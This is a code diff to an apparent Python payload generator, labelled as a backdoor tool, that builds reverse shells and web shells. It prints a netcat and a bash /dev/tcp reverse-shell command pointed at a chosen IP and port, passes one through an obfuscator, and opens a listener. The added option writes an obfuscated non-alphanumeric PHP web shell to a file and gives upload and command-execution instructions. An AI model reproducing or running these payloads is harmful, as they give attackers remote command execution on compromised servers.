@@ -10,7 +10,7 @@ Category: backdoors
 """
 
 """
-requirements:
+Requirements:
 
 Run setup.py
 
@@ -22,6 +22,7 @@ import netifaces as ifaces
 import re 
 import os 
 import linecache # for reading specific lines
+import pathlib
 
 
 
@@ -40,7 +41,7 @@ def full():
     global ip
     global port
     
-    print("please select language and shell option:\n\n [1] - python (Alphanumeric reverse shell)\n\n [2] - PHP(Alphanumeric reverse shell)\n\n [3] - Bash(Reverse shell)\n\n [4] - Netcat(Reverse shell) \n\n\nAdvanced:\n\n [5] - Bash(obfuscated bash reverse shell)\n\n  ")
+    print("please select language and shell option:\n\n [1] - python (Alphanumeric reverse shell)\n\n [2] - PHP(Alphanumeric reverse shell)\n\n [3] - Bash(Reverse shell)\n\n [4] - Netcat(Reverse shell) \n\n\nAdvanced:\n\n [5] - Bash(obfuscated bash reverse shell)\n\n [6] - PHP(Non-Alphanumreric php shell)")
     
     selection = input("Type in a choosen number:\t\n")
     
@@ -87,7 +88,7 @@ def full():
                 #print(ipreplaced.replace("[port]", '"{}"')).format(port)
                         
                 print("Run the following payload on target: \n")
-                
+
                 print("mkfifo pipe && nc {} {} <pipe | /bin/bash &>pipe".format(ip, port), "\n")
 
                 print("or\n")
@@ -111,7 +112,19 @@ def full():
                     finalpayload = os.system("bashfuscator -c 'bash -i >& /dev/tcp/{}/{} 0>&1'").format(str((ip, port)))
                     print(finalpayload, end=" ")
                     os.system(str("netcat -nvlp {}").format(port))
-
+    elif int(selection) == 6:
+        parameter = "?0=system &1=uname  %20-a'"
+        
+        name = str(input("Name of file to output payload to: "))
+        
+        payload = str("@$_[]=@!+_; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((++$__)+($__++ ))].=$_;\n $_[]=++$__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__+$__)+ $_[$__-$__]).($__+$__+$__)+$_[$__-$__];\n $_[$__+$__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );\n $_[$__+$__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );\n $_[$__+$__] .=($_[$__][$__+$__])^$_[$__][($__<<$__)-$__ ];\n$_=$\n $_[$__+ $__] ;$_[@-_]($_[@!+_] ) ;")
+        
+        with open(name, "w+") as backdoor:
+          backdoor.write(payload)
+          path = pathlib.Path().parent.absolute()
+          print("File written to: {}/{} \n".format(path, name)) 
+          print("example USAGE: Upload {} and use the following parameter for command execution: {}  ".format(name, parameter)) 
+        
 full()
 
 
